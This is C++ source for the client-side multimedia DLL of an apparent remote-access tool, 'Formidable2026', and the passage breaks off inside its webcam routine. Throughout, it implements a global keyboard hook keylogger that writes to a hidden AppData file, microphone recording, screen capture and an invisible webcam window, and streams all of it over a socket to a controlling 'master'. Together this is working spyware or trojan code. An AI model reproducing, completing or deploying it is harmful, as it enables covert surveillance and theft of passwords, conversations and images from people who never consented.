/**
 * Formidable2026 - Multimedia Module (被控端DLL)
 * 运行在被控端（Client），处理音频、视频、键盘记录
 * 数据通过socket发送回主控端（Master）
 */
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef _WINSOCKAPI_
#define _WINSOCKAPI_
#endif
#include <windows.h>
#include <winsock2.h>
#include <mmsystem.h>
#include <vfw.h>
#include <vector>
#include <string>
#include <thread>
#include <shlobj.h>
#include <gdiplus.h>
#include "../../Common/Config.h"

#include "DXGICapture.h"

// TurboJPEG 高性能 JPEG 压缩支持
#ifdef USE_TURBOJPEG
#include <turbojpeg.h>
#endif

// LAME MP3 编码支持
#ifdef USE_LAME
#include <lame.h>
#endif

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "vfw32.lib")

using namespace Formidable;
using namespace Gdiplus;

// 全局变量
SOCKET g_socket = INVALID_SOCKET;
HWAVEIN g_hWaveIn = NULL;
WAVEHDR g_WaveHdr[2];
char g_WaveBuffer[2][8192];

ULONG_PTR g_gdiplusToken;
int g_compressType = 0; // 0=RAW(BMP), 1=JPEG(GDI+), 2=JPEG(TurboJPEG)
int g_captureMethod = 0; // 0=GDI, 1=DXGI
DXGICapture* g_dxgiCapture = NULL;

#ifdef USE_TURBOJPEG
tjhandle g_tjCompressor = NULL;
#endif

#ifdef USE_LAME
lame_t g_lameEncoder = NULL;
#endif

// 键盘记录相关
HHOOK g_hKeyHook = NULL;
std::string g_keyData;
FILE* g_keylogFile = NULL;
bool g_offlineMode = false; // 离线记录模式
bool g_offlineRecordEnabled = true; // 离线记录开关（默认启用）
std::string g_keylogFilePath;

// 获取键盘记录文件路径
std::string GetKeylogFilePath() {
    char szPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, szPath) == S_OK) {
        std::string path = szPath;
        path += "\\Formidable2026";
        CreateDirectoryA(path.c_str(), NULL);
        path += "\\keylog.dat";
        return path;
    }
    return "keylog.dat";
}

// 写入按键到文件
void WriteKeyToFile(const char* key, int len) {
    // 检查离线记录开关
    if (!g_offlineRecordEnabled) {
        return;
    }
    
    if (!g_keylogFile) {
        g_keylogFilePath = GetKeylogFilePath();
        g_keylogFile = fopen(g_keylogFilePath.c_str(), "ab"); // 追加模式
    }
    if (g_keylogFile) {
        // 添加时间戳
        SYSTEMTIME st;
        GetLocalTime(&st);
        char timestamp[64];
        sprintf(timestamp, "[%04d-%02d-%02d %02d:%02d:%02d] ",
            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
        fwrite(timestamp, 1, strlen(timestamp), g_keylogFile);
        fwrite(key, 1, len, g_keylogFile);
        fflush(g_keylogFile); // 立即写入磁盘
    }
}

// 屏幕监控相关
bool g_screenRunning = false;
std::thread g_screenThread;
int g_screenFPS = 10;
int g_screenQuality = 0; // 0=1080p限制, 1=原始分辨率
bool g_inputLocked = false;

// 视频监控相关
bool g_videoRunning = false;
HWND g_hCap = NULL;
std::thread g_videoThread;

// 屏幕优化相关全局变量
bool g_useGrayscale = false; // 是否使用灰度模式
bool g_useBlockDiff = false; // 是否使用差异检测
std::vector<BYTE> g_prevFrameBuffer; // 上一帧缓存
int g_prevWidth = 0;
int g_prevHeight = 0;

// 辅助函数：转换为灰度
void ConvertToGrayscale(BYTE* pData, int width, int height, int pitch) {
    // 假设是 24-bit BGR
    // 为了性能，不使用浮点数
    for (int y = 0; y < height; ++y) {
        BYTE* row = pData + y * pitch;
        for (int x = 0; x < width; ++x) {
            BYTE* pixel = row + x * 3;
            BYTE b = pixel[0];
            BYTE g = pixel[1];
            BYTE r = pixel[2];
            // Y = 0.299R + 0.587G + 0.114B
            // 近似: (R*30 + G*59 + B*11) / 100
            BYTE gray = (BYTE)((r * 30 + g * 59 + b * 11) / 100);
            pixel[0] = gray;
            pixel[1] = gray;
            pixel[2] = gray;
        }
    }
}

// 辅助函数：脏矩形检测
// 返回是否发生变化
bool GetDirtyRect(const BYTE* current, const BYTE* prev, int width, int height, int pitch, RECT* rect) {
    if (!prev) {
        rect->left = 0; rect->top = 0; rect->right = width; rect->bottom = height;
        return true;
    }

    int minX = width, minY = height, maxX = 0, maxY = 0;
    bool changed = false;

    for (int y = 0; y < height; y += 4) { // 简单优化：跳行扫描，步长4
        const BYTE* rowC = current + y * pitch;
        const BYTE* rowP = prev + y * pitch;
        
        // 如果整行内存相同，跳过
        if (memcmp(rowC, rowP, width * 3) == 0) continue;

        if (y < minY) minY = y;
        if (y > maxY) maxY = y;
        changed = true;
        
        // 扫描该行的列
        for (int x = 0; x < width; x += 4) { // 步长4
            const BYTE* pC = rowC + x * 3;
            const BYTE* pP = rowP + x * 3;
            if (pC[0] != pP[0] || pC[1] != pP[1] || pC[2] != pP[2]) {
                if (x < minX) minX = x;
                if (x > maxX) maxX = x;
            }
        }
    }

    if (!changed) return false;

    // 修正边界
    rect->left = max(0, minX);
    rect->top = max(0, minY);
    rect->right = min(width, maxX + 4); // 补回步长
    rect->bottom = min(height, maxY + 4); // 补回步长
    
    return true;
}


// 辅助函数：绘制鼠标光标，避免使用 CAPTUREBLT 导致的闪烁
void DrawMouseCursor(HDC hMemDC, int screenX, int screenY, int width, int height, int targetWidth, int targetHeight) {
    CURSORINFO ci = { sizeof(CURSORINFO) };
    if (GetCursorInfo(&ci) && (ci.flags & CURSOR_SHOWING)) {
        ICONINFO ii = { 0 };
        if (GetIconInfo((HICON)ci.hCursor, &ii)) {
            int cursorX = ci.ptScreenPos.x - screenX - ii.xHotspot;
            int cursorY = ci.ptScreenPos.y - screenY - ii.yHotspot;

            // 如果有缩放，需要调整坐标
            if (targetWidth != width || targetHeight != height) {
                cursorX = (int)(cursorX * (double)targetWidth / width);
                cursorY = (int)(cursorY * (double)targetHeight / height);
            }

            DrawIconEx(hMemDC, cursorX, cursorY, (HICON)ci.hCursor, 0, 0, 0, NULL, DI_NORMAL);
            
            if (ii.hbmMask) DeleteObject(ii.hbmMask);
            if (ii.hbmColor) DeleteObject(ii.hbmColor);
        }
    }
}

// 发送响应数据到主控端（Master）
bool SendResponse(SOCKET s, uint32_t cmd, const void* data, int len) {
    PkgHeader header;
    memcpy(header.flag, "FRMD26?", 7);
    header.originLen = sizeof(CommandPkg) - 1 + len;
    header.totalLen = sizeof(PkgHeader) + header.originLen;
    
    std::vector<char> buffer(header.totalLen);
    memcpy(buffer.data(), &header, sizeof(PkgHeader));
    
    CommandPkg* pkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
    pkg->cmd = cmd;
    pkg->arg1 = len;
    if (len > 0 && data) {
        memcpy(pkg->data, data, len);
    }

    const char* pData = buffer.data();
    int remaining = (int)buffer.size();
    while (remaining > 0) {
        int sent = send(s, pData, remaining, 0);
        if (sent == SOCKET_ERROR || sent == 0) return false;
        pData += sent;
        remaining -= sent;
    }
    return true;
}

// 录音回调函数
void CALLBACK waveInProc(HWAVEIN hwi, UINT uMsg, DWORD_PTR dwInstance, DWORD_PTR dwParam1, DWORD_PTR dwParam2) {
    if (uMsg == WIM_DATA) {
        PWAVEHDR pwh = (PWAVEHDR)dwParam1;
        if (pwh->dwBytesRecorded > 0) {
#ifdef USE_LAME
            if (g_lameEncoder) {
                // 使用 LAME 进行 MP3 编码
                int numSamples = pwh->dwBytesRecorded / 2; // 16-bit PCM，每个样本2字节
                int mp3BufSize = (int)(1.25 * numSamples + 7200); // LAME 推荐的缓冲区大小
                std::vector<unsigned char> mp3Buf(mp3BufSize);
                
                int mp3Size = lame_encode_buffer(
                    g_lameEncoder,
                    (short*)pwh->lpData,    // PCM 数据
                    NULL,                    // 单声道，右声道为 NULL
                    numSamples,
                    mp3Buf.data(),
                    mp3BufSize
                );
                
                if (mp3Size > 0) {
                    SendResponse(g_socket, CMD_VOICE_STREAM, mp3Buf.data(), mp3Size);
                }
            } else
#endif
            {
                // 发送原始 PCM 数据（备用）
                SendResponse(g_socket, CMD_VOICE_STREAM, pwh->lpData, pwh->dwBytesRecorded);
            }
        }
        waveInAddBuffer(hwi, pwh, sizeof(WAVEHDR));
    }
}

void StartVoice(SOCKET s) {
    g_socket = s;

#ifdef USE_LAME
    // 初始化 LAME 编码器
    if (!g_lameEncoder) {
        g_lameEncoder = lame_init();
        if (g_lameEncoder) {
            lame_set_num_channels(g_lameEncoder, 1);       // 单声道
            lame_set_in_samplerate(g_lameEncoder, 8000);   // 输入采样率 8kHz
            lame_set_brate(g_lameEncoder, 32);             // 比特率 32kbps（语音足够）
            lame_set_mode(g_lameEncoder, MONO);            // 单声道模式
            lame_set_quality(g_lameEncoder, 7);            // 质量等级 0-9，7 为快速编码
            lame_init_params(g_lameEncoder);
        }
    }
#endif

    WAVEFORMATEX wfx;
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 1;
    wfx.nSamplesPerSec = 8000;
    wfx.wBitsPerSample = 16;
    wfx.nBlockAlign = wfx.nChannels * wfx.wBitsPerSample / 8;
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
    wfx.cbSize = 0;

    if (waveInOpen(&g_hWaveIn, WAVE_MAPPER, &wfx, (DWORD_PTR)waveInProc, 0, CALLBACK_FUNCTION) != MMSYSERR_NOERROR) {
        return;
    }

    for (int i = 0; i < 2; i++) {
        g_WaveHdr[i].lpData = g_WaveBuffer[i];
        g_WaveHdr[i].dwBufferLength = 8192;
        g_WaveHdr[i].dwBytesRecorded = 0;
        g_WaveHdr[i].dwUser = 0;
        g_WaveHdr[i].dwFlags = 0;
        g_WaveHdr[i].dwLoops = 0;
        waveInPrepareHeader(g_hWaveIn, &g_WaveHdr[i], sizeof(WAVEHDR));
        waveInAddBuffer(g_hWaveIn, &g_WaveHdr[i], sizeof(WAVEHDR));
    }

    waveInStart(g_hWaveIn);
}

void StopVoice() {
    if (g_hWaveIn) {
        waveInStop(g_hWaveIn);
        waveInReset(g_hWaveIn);
        for (int i = 0; i < 2; i++) {
            waveInUnprepareHeader(g_hWaveIn, &g_WaveHdr[i], sizeof(WAVEHDR));
        }
        waveInClose(g_hWaveIn);
        g_hWaveIn = NULL;
    }

#ifdef USE_LAME
    // 释放 LAME 编码器
    if (g_lameEncoder) {
        lame_close(g_lameEncoder);
        g_lameEncoder = NULL;
    }
#endif
}

// 键盘钩子回调
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
        char szKey[32] = {0};
        
        if (pKey->vkCode >= 0x30 && pKey->vkCode <= 0x5A) { // A-Z, 0-9
            szKey[0] = (char)pKey->vkCode;
        } else if (pKey->vkCode == VK_RETURN) {
            strcpy(szKey, "[ENTER]\n");
        } else if (pKey->vkCode == VK_SPACE) {
            strcpy(szKey, " ");
        } else if (pKey->vkCode == VK_BACK) {
            strcpy(szKey, "[BACK]");
        }
        
        // 实时发送每个按键并写入文件
        if (szKey[0] != 0) {
            int len = (int)strlen(szKey);
            
            // 写入离线记录文件
            WriteKeyToFile(szKey, len);
            
            // 如果socket有效，实时发送
            if (g_socket != INVALID_SOCKET) {
                SendResponse(g_socket, CMD_KEYLOG, szKey, len);
            }
        }
    }
    return CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
}

void StartKeylog(SOCKET s) {
    g_socket = s;
    g_offlineMode = (s == INVALID_SOCKET);
    if (g_hKeyHook == NULL) {
        g_hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    }
}

void StopKeylog() {
    if (g_hKeyHook) {
        UnhookWindowsHookEx(g_hKeyHook);
        g_hKeyHook = NULL;
    }
    // 关闭文件句柄
    if (g_keylogFile) {
        fclose(g_keylogFile);
        g_keylogFile = NULL;
    }
}

// 读取离线记录并发送
void SendOfflineKeylog(SOCKET s) {
    std::string filepath = GetKeylogFilePath();
    FILE* f = fopen(filepath.c_str(), "rb");
    if (f) {
        fseek(f, 0, SEEK_END);
        long size = ftell(f);
        fseek(f, 0, SEEK_SET);
        
        if (size > 0 && size < 10 * 1024 * 1024) { // 限制10MB
            std::vector<char> buffer(size);
            fread(buffer.data(), 1, size, f);
            SendResponse(s, CMD_KEYLOG, buffer.data(), (int)size);
        }
        fclose(f);
    }
}

// 清空离线记录
void ClearOfflineKeylog() {
    std::string filepath = GetKeylogFilePath();
    DeleteFileA(filepath.c_str());
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;
    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

// 被控端屏幕捕获线程：捕获屏幕并发送数据到主控端
void ScreenThread(SOCKET s) {
    HDC hScreenDC = GetDC(NULL);
    HDC hMemDC = CreateCompatibleDC(hScreenDC);
    
    // 初始化 GDI+
    GdiplusStartupInput gsi;
    GdiplusStartup(&g_gdiplusToken, &gsi, NULL);
    CLSID clsidJpeg;
    GetEncoderClsid(L"image/jpeg", &clsidJpeg);

#ifdef USE_TURBOJPEG
    // 初始化 TurboJPEG 压缩器
    if (!g_tjCompressor) {
        g_tjCompressor = tjInitCompress();
    }
#endif

    // 缓存资源，避免重复创建
    HBITMAP hBitmap = NULL;
    HBITMAP hOldBitmap = NULL;
    void* pBits = NULL;
    int cachedWidth = 0;
    int cachedHeight = 0;
    
    // 初始化 DXGI
    if (g_captureMethod == 1) {
        if (!g_dxgiCapture) g_dxgiCapture = new DXGICapture();
        if (!g_dxgiCapture->Initialize()) {
            // 初始化失败回退到 GDI
            delete g_dxgiCapture;
            g_dxgiCapture = NULL;
            g_captureMethod = 0;
        }
    }
    
    // DXGI 缓冲区
    std::vector<BYTE> dxgiBuffer;
    int dxgiFailCount = 0;
    bool tjEnabled = false;

#ifdef USE_TURBOJPEG
    // 初始化 TurboJPEG 压缩器
    if (!g_tjCompressor) {
        g_tjCompressor = tjInitCompress();
    }
    tjEnabled = (g_tjCompressor != NULL);
#endif

    while (g_screenRunning) {
        int screenX = GetSystemMetrics(SM_XVIRTUALSCREEN);
        int screenY = GetSystemMetrics(SM_YVIRTUALSCREEN);
        int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
        int targetWidth = width;
        int targetHeight = height;

        if (g_screenQuality == 0) { // 1080P限制
            if (targetWidth > 1920) {
                targetHeight = (int)(targetHeight * 1920.0 / targetWidth);
                targetWidth = 1920;
            }
        }

        BOOL bltResult = FALSE;

        // DXGI 截屏逻辑
        if (g_captureMethod == 1 && g_dxgiCapture) {
        int dxgiW = 0, dxgiH = 0;
        // 100ms 超时
        if (g_dxgiCapture->CaptureFrame(dxgiBuffer, dxgiW, dxgiH, 100)) {
            pBits = dxgiBuffer.data();
            targetWidth = dxgiW;
            targetHeight = dxgiH;
            bltResult = TRUE;
            dxgiFailCount = 0;
        } else {
            // 检查是否是因为设备丢失导致的失败
            // 如果 g_dxgiCapture 内部已经 Cleanup 了，说明确实有问题
            // DXGICapture::CaptureFrame 内部会尝试重新初始化
            dxgiFailCount++;
            
            if (dxgiFailCount > 20) { 
                // 降级到 GDI
                if (g_dxgiCapture) {
                    delete g_dxgiCapture;
                    g_dxgiCapture = NULL;
                }
                g_captureMethod = 0;
            }
        }
    } 
    
    // GDI 截屏逻辑 (如果是 GDI 模式，或者 DXGI 刚刚降级)
    if (g_captureMethod == 0) {
        // 确保清除 DXGI 计数
        dxgiFailCount = 0;
        
        // 检查是否需要重建 DIBSection (尺寸变化或首次创建)
        if (hBitmap == NULL || cachedWidth != targetWidth || cachedHeight != targetHeight) {
            if (hOldBitmap) SelectObject(hMemDC, hOldBitmap);
            if (hBitmap) DeleteObject(hBitmap);
            
            BITMAPINFO bi = { 0 };
            bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
            bi.bmiHeader.biWidth = targetWidth;
            bi.bmiHeader.biHeight = -targetHeight; // Top-Down 简化差异检测和坐标计算
            bi.bmiHeader.biPlanes = 1;
            bi.bmiHeader.biBitCount = 24;
            bi.bmiHeader.biCompression = BI_RGB;
            
            hBitmap = CreateDIBSection(hScreenDC, &bi, DIB_RGB_COLORS, &pBits, NULL, 0);
            if (!hBitmap) {
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                continue;
            }
            
            hOldBitmap = (HBITMAP)SelectObject(hMemDC, hBitmap);
            cachedWidth = targetWidth;
            cachedHeight = targetHeight;
        }
        
        // 执行截屏
        if (targetWidth == width && targetHeight == height) {
            bltResult = BitBlt(hMemDC, 0, 0, width, height, hScreenDC, screenX, screenY, SRCCOPY);
        } else {
            SetStretchBltMode(hMemDC, HALFTONE);
            bltResult = StretchBlt(hMemDC, 0, 0, targetWidth, targetHeight, hScreenDC, screenX, screenY, width, height, SRCCOPY);
        }

        // 手动绘制鼠标光标，避免 CAPTUREBLT 导致的闪烁
        if (bltResult) {
            DrawMouseCursor(hMemDC, screenX, screenY, width, height, targetWidth, targetHeight);
        }
    }

        if (!bltResult) {
            // 截屏失败（DXGI 超时且未降级）
            // 发送心跳包防止超时？或者什么都不做等待下一次？
            // 这里我们选择等待。
            std::this_thread::sleep_for(std::chrono::milliseconds(50));
            continue;
        }

        // 计算步长 (4字节对齐)
        int pitch = ((targetWidth * 24 + 31) & ~31) / 8;

        
        // 1. 灰度处理
        if (g_useGrayscale && pBits) {
            ConvertToGrayscale((unsigned char*)pBits, targetWidth, targetHeight, pitch);
        }

        // 2. 差异检测
        RECT dirty = {0, 0, targetWidth, targetHeight};
        bool isDiff = false;
        
        if (g_useBlockDiff && pBits) {
            if (g_prevWidth != targetWidth || g_prevHeight != targetHeight) {
                // 尺寸变化，重置缓存
                g_prevFrameBuffer.assign((BYTE*)pBits, (BYTE*)pBits + pitch * targetHeight);
                g_prevWidth = targetWidth;
                g_prevHeight = targetHeight;
                // 全量发送
            } else {
                if (GetDirtyRect((BYTE*)pBits, g_prevFrameBuffer.data(), targetWidth, targetHeight, pitch, &dirty)) {
                    isDiff = true;
                    // 更新缓存 (全量)
                    memcpy(g_prevFrameBuffer.data(), pBits, pitch * targetHeight);
                } else {
                    // 无变化，跳过
                    std::this_thread::sleep_for(std::chrono::milliseconds(10));
                    continue;
                }
            }
        }

        // 确定发送区域
        int sendX = isDiff ? dirty.left : 0;
        int sendY = isDiff ? dirty.top : 0;
        int sendW = isDiff ? (dirty.right - dirty.left) : targetWidth;
        int sendH = isDiff ? (dirty.bottom - dirty.top) : targetHeight;
        
        if (sendW <= 0 || sendH <= 0) continue;

        bool sent = false;
#ifdef USE_TURBOJPEG
        if ((g_compressType == 1 || g_compressType == 2) && tjEnabled && pBits) {
            // 使用 TurboJPEG 高性能压缩
            unsigned char* jpegBuf = NULL;
            unsigned long jpegSize = 0;
            int quality = 60; // JPEG 质量 (1-100)
            
            // 注意：pBits 是自底向上的数据，Y轴是反的。
            // DirtyRect 的 Y 是从上到下计算的（假设内存也是从上到下？不，DIBSection 是倒的）
            // 这是一个大坑。CreateDIBSection 默认高度为正时，是 Bottom-Up。
            // 此时内存里第一行实际上是图片的最后一行。
            // 但是我们的 GetDirtyRect 只是按内存顺序比较。
            // 如果是 Bottom-Up：
            // 内存 index 0 是 Bottom line。
            // GetDirtyRect 返回的 minY 实际上是 Bottom line 的 index。
            // 所以我们需要小心处理坐标。
            
            // 简单起见，我们不管它倒不倒，只把这一块内存当做图像压缩发送。
            // 只要主控端恢复时也按同样方式处理。
            // TurboJPEG TJFLAG_BOTTOMUP 会处理这个。
            // 如果我们传入全图指针，并告诉它只压缩某个区域？TurboJPEG 不支持直接 Crop 压缩（除非用 Transform）。
            // tjCompress2 需要传入 buffer 起始位置。
            
            // 如果是 Bottom-Up DIB：
            // 内存起始位置 pBits 指向最后一行 (y=height-1)。
            // 内存布局：Row(H-1), Row(H-2), ... Row(0).
            // GetDirtyRect 返回的 y 是基于内存的偏移。
            // 假设 GetDirtyRect 返回 y=0 到 10，这对应屏幕的最底部 10 行。
            // 发送时，我们发送这块内存。
            // 主控端收到后，把这块内存贴到 BackBuffer 的对应内存位置。
            // 如果我们发送坐标信息，主控端如果是用 GDI 绘图，坐标是 Top-Down 的。
            // 所以我们必须把内存坐标转换为屏幕坐标。
            
            // 为了避免这种复杂性，我们可以把 DIBSection 创建为 Top-Down (高度设为负值)。
            // 在上面代码里：bi.bmiHeader.biHeight = targetHeight; (正数，Bottom-Up)
            // 让我们改为 Top-Down 以简化逻辑。
            // 但是为了兼容旧代码（可能有地方依赖 Bottom-Up），我们得小心。
            // 不过这里我正在重写这部分。
            
            // 暂时按 Bottom-Up 处理：
            // 发送全图时，TJFLAG_BOTTOMUP 会翻转。
            // 发送局部时，如果我们直接给 TurboJPEG 一块内存，它不知道这块内存是倒的图像的一部分。
            // 除非我们只把它当做独立的小图片压缩。
            // 接收端收到小图片，解码出来也是小图片。
            // 然后接收端把小图片贴到大图的特定位置。
            
            // 如果我们用 Top-Down DIB，逻辑会简单很多。
            // 我决定修改 DIB 创建参数为 Top-Down。
            
            // 指针偏移计算 (Top-Down):
            BYTE* pSrcInfo = (BYTE*)pBits + sendY * pitch + sendX * 3;
            
            if (tjCompress2(g_tjCompressor, (unsigned char*)pSrcInfo, 
                           sendW, pitch, sendH, 
                           TJPF_BGR, &jpegBuf, &jpegSize, 
                           TJSAMP_420, quality, TJFLAG_FASTDCT) == 0) { // 移除 TJFLAG_BOTTOMUP 因为我们将改为 Top-Down
                           
                // 构造数据包
                // 如果是 Diff，我们需要发送坐标
                // 利用 CommandPkg 的机制？
                // SendResponse 只是发送 CommandPkg 的 data 部分。
                // 我们需要自定义 data。
                
                int headSize = isDiff ? 16 : 0; // x,y,w,h
                std::vector<char> finalBuf(headSize + jpegSize);
                
                if (isDiff) {
                    memcpy(finalBuf.data(), &sendX, 4);
                    memcpy(finalBuf.data() + 4, &sendY, 4);
                    memcpy(finalBuf.data() + 8, &sendW, 4);
                    memcpy(finalBuf.data() + 12, &sendH, 4);
                }
                memcpy(finalBuf.data() + headSize, jpegBuf, jpegSize);
                
                // arg2 = isDiff ? 1 : 0
                // SendResponse 不支持自定义 arg2。
                // 我们需要手动发送 Pkg。
                // 或者修改 SendResponse? SendResponse 是 Utils 里的。
                // 或者直接在这里构造包。
                
                size_t bodySize = sizeof(CommandPkg) - 1 + finalBuf.size();
                std::vector<char> pkgBuf(sizeof(PkgHeader) + bodySize);
                
                PkgHeader* hdr = (PkgHeader*)pkgBuf.data();
                memcpy(hdr->flag, "FRMD26?", 7);
                hdr->totalLen = (int)pkgBuf.size();
                hdr->originLen = (int)bodySize;
                
                CommandPkg* pkg = (CommandPkg*)(pkgBuf.data() + sizeof(PkgHeader));
                pkg->cmd = CMD_SCREEN_CAPTURE;
                pkg->arg1 = (uint32_t)finalBuf.size();
                pkg->arg2 = isDiff ? 1 : 0;
                memcpy(pkg->data, finalBuf.data(), finalBuf.size());
                
                const char* pData = pkgBuf.data();
                int remaining = (int)pkgBuf.size();
                while (remaining > 0) {
                    int sentBytes = send(s, pData, remaining, 0);
                    if (sentBytes == SOCKET_ERROR || sentBytes == 0) {
                        tjFree(jpegBuf);
                        g_screenRunning = false;
                        break;
                    }
                    pData += sentBytes;
                    remaining -= sentBytes;
                }
                
                tjFree(jpegBuf);
                sent = true;
                if (!g_screenRunning) break;
            }
        }
#endif

        // GDI+ 备用压缩
        if (!sent && g_compressType == 1) { 
            Bitmap bitmap(hBitmap, NULL);
            IStream* pStream = NULL;
            if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) == S_OK) {
                EncoderParameters encoderParams;
                encoderParams.Count = 1;
                encoderParams.Parameter[0].Guid = EncoderQuality;
                encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
                encoderParams.Parameter[0].NumberOfValues = 1;
                long quality = 60; 
                encoderParams.Parameter[0].Value = &quality;

                if (bitmap.Save(pStream, &clsidJpeg, &encoderParams) == Ok) {
                    HGLOBAL hGlobal = NULL;
                    if (GetHGlobalFromStream(pStream, &hGlobal) == S_OK) {
                        void* pData = GlobalLock(hGlobal);
                        size_t size = GlobalSize(hGlobal);
                        if (!SendResponse(s, CMD_SCREEN_CAPTURE, pData, (int)size)) {
                            GlobalUnlock(hGlobal);
                            pStream->Release();
                            g_screenRunning = false;
                            break;
                        }
                        GlobalUnlock(hGlobal);
                        sent = true;
                    }
                }
                pStream->Release();
            }
        }
        
        // 原始 BMP 发送
        if (!sent && pBits) {
            // 构造完整的 BMP 文件数据
            DWORD dwDataSize = ((targetWidth * 24 + 31) / 32) * 4 * targetHeight;
            size_t totalSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwDataSize;
            std::vector<char> bmpBuffer(totalSize);
            
            BITMAPFILEHEADER* pBFH = (BITMAPFILEHEADER*)bmpBuffer.data();
            BITMAPINFOHEADER* pBIH = (BITMAPINFOHEADER*)(bmpBuffer.data() + sizeof(BITMAPFILEHEADER));
            
            pBFH->bfType = 0x4D42; // "BM"
            pBFH->bfSize = (DWORD)totalSize;
            pBFH->bfReserved1 = 0;
            pBFH->bfReserved2 = 0;
            pBFH->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
            
            pBIH->biSize = sizeof(BITMAPINFOHEADER);
            pBIH->biWidth = targetWidth;
            pBIH->biHeight = targetHeight;
            pBIH->biPlanes = 1;
            pBIH->biBitCount = 24;
            pBIH->biCompression = BI_RGB;
            pBIH->biSizeImage = 0;
            pBIH->biXPelsPerMeter = 0;
            pBIH->biYPelsPerMeter = 0;
            pBIH->biClrUsed = 0;
            pBIH->biClrImportant = 0;
            
            memcpy(bmpBuffer.data() + pBFH->bfOffBits, pBits, dwDataSize);
            
            if (!SendResponse(s, CMD_SCREEN_CAPTURE, bmpBuffer.data(), (int)bmpBuffer.size())) {
                g_screenRunning = false;
                break;
            }
        }

        uint32_t delay = 1000 / (g_screenFPS > 0 ? g_screenFPS : 1);
        std::this_thread::sleep_for(std::chrono::milliseconds(delay));
    }
    
    // 清理资源
    if (hOldBitmap) SelectObject(hMemDC, hOldBitmap);
    if (hBitmap) DeleteObject(hBitmap);
    DeleteDC(hMemDC);
    ReleaseDC(NULL, hScreenDC);
    GdiplusShutdown(g_gdiplusToken);

#ifdef USE_TURBOJPEG
    if (g_tjCompressor) {
        tjDestroy(g_tjCompressor);
        g_tjCompressor = NULL;
    }
#endif
}

void StartScreen(SOCKET s) {
    if (g_screenRunning) {
        g_screenRunning = false;
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    }
    g_screenRunning = true;
    g_screenThread = std::thread(ScreenThread, s);
    g_screenThread.detach();
}

void StopScreen() {
    if (g_screenRunning) {
        g_screenRunning = false;
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    }
    
    // 清理 DXGI
    if (g_dxgiCapture) {
        delete g_dxgiCapture;
        g_dxgiCapture = NULL;
    }
}

// VFW 回调函数
LRESULT CALLBACK FrameCallbackProc(HWND hWnd, LPVIDEOHDR lpVHdr) {
    if (!g_videoRunning) return 0;
    
    // VFW 默认格式是 DIB (Device Independent Bitmap)，但不带 BITMAPFILEHEADER
    // 我们需要构建完整的 BMP 格式或者直接发送 DIB 数据（如果主控端支持）
    // 这里为了统一，我们加上 BITMAPFILEHEADER
    
    BITMAPINFOHEADER* bmi = (BITMAPINFOHEADER*)capGetUserData(hWnd);
    if (!bmi) return 0;
    
    DWORD dwDataSize = lpVHdr->dwBytesUsed;
    DWORD dwFileSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwDataSize;
    
    // 发送完整 BMP
    std::vector<char> bmpBuffer(dwFileSize);
    BITMAPFILEHEADER* bmf = (BITMAPFILEHEADER*)bmpBuffer.data();
    bmf->bfType = 0x4D42;
    bmf->bfSize = dwFileSize;
    bmf->bfReserved1 = 0;
    bmf->bfReserved2 = 0;
    bmf->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    
    memcpy(bmpBuffer.data() + sizeof(BITMAPFILEHEADER), bmi, sizeof(BITMAPINFOHEADER));
    memcpy(bmpBuffer.data() + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), lpVHdr->lpData, dwDataSize);
    
    SendResponse(g_socket, CMD_VIDEO_STREAM, bmpBuffer.data(), (int)bmpBuffer.size());
    
    return 1;
}

void VideoThread(SOCKET s) {
    // 创建一个不可见的捕获窗口
    g_hCap = capCreateCaptureWindowA("Cam", WS_POPUP, 0, 0, 320, 240, GetDesktopWindow(), 0);
    if (!g_hCap) return;
    
    if (capDriverConnect(g_hCap, 0)) {
        capPreview(g_hCap, FALSE);
        capPreviewRate(g_hCap, 100); // 10 FPS
        capPreviewScale(g_hCap, FALSE);
        
        // 获取当前格式
        DWORD dwSize = capGetVideoFormatSize(g_hCap);
        BITMAPINFO* bmi = (BITMAPINFO*)malloc(dwSize);
        capGetVideoFormat(g_hCap, bmi, dwSize);
        
        // 强制设置为 320x240 RGB24 (如果支持)
        bmi->bmiHeader.biWidth = 320;
